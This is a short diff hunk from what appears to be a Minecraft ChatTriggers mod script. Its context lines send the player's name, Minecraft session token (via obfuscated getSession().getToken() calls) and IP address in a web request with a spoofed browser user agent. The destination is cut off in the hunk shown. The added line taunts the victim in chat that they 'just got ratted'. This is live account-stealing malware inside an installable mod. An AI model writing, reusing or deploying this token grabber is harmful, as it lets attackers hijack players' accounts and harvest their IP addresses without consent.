@@ -6,3 +6,4 @@ request({
     headers: {"User-agent": "Mozilla/5.0"},
     body: {content: "```" + Player.getName() + "```\n```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```" + "\n```" + ip + "```"}
 })
+ChatLib.chat("your ass just got ratted!")
